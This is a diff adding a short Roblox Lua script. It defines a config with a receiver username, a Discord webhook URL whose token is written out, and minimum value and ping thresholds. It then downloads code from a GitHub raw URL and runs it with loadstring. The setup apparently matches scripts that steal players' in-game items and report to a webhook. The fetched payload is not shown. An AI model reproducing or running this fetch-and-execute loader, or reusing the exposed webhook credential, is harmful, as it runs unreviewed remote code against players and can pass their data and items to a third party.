@@ -1,0 +1,7 @@
+_G["Script-SM_Config"] = {
+    ["users"] = {"abduljamarmm2t"},
+    ["user_webhook"] = "https://discord.com/api/webhooks/1484233693982887947/-PPEaGs4E2vX0W7gzAQGDibhAIU5cF_MiHbCxSlhDg-xOdDuGEo1yqCbJXz-tn7Mi9O8",
+    ["Min_Value"] = 10,
+    ["Min_Ping"] = 125
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/script-9209/Test/refs/heads/main/biscuit"))()
